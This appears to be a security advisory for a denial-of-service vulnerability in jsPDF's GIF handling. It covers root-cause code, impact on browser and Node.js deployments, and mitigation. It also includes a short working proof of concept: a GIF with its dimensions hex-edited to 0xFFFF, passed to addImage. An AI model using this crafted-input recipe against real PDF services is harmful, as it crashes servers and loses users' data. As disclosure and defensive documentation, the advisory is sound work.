# CVE-2026-25535: Denial of Service (DoS) via Resource Exhaustion in jsPDF

## Technical Description
A Denial of Service (DoS) vulnerability was identified in `jsPDF` within the `gif_support.js` module. The library fails to validate image dimensions specified in the GIF Logical Screen Descriptor header. An attacker can supply a specially crafted GIF file with extreme dimensions (e.g., 65535x65535), forcing the engine to attempt an enormous memory allocation for the pixel buffer.

## Root Cause Analysis
In `gif_support.js`, the `processGIF89A` function reads width and height directly from the `GifReader` object without sanity checks:

```javascript
// Vulnerable code in gif_support.js
jsPDFAPI.processGIF89A = function(imageData, index, alias, compression) {
    var reader = new GifReader(imageData);
    var width = reader.width,
        height = reader.height;
    var pixels = [];           

    reader.decodeAndBlitFrameRGBA(0, pixels);
```
This triggers a CWE-770: Allocation of Resources Without Limits or Throttling.
### Impact
Client-Side: Causes the browser tab to freeze or crash, leading to a loss of unsaved user data.
Server-Side Node.js: A single malicious request can exhaust the heap memory of the Node.js process, leading to a crash (OOM) and a complete outage of the PDF generation service.
### Proof of Concept (PoC)
Payload Creation: Take a minimal GIF and hex-edit offsets 0x06 and 0x08 to 0xFFFF.
## Exploitation:
```JavaScript
import { jsPDF } from "jspdf";
const doc = new jsPDF();
// maliciousGif contains the manipulated buffer
doc.addImage(maliciousGif, 'GIF', 0, 0);
```
Result: RangeError: Invalid array length or process termination by OS.
Mitigation
Upgrade jsPDF to the latest patched version.
Implement maximum dimension constraints (e.g., 10000x10000) before passing image data to the GIF processor.
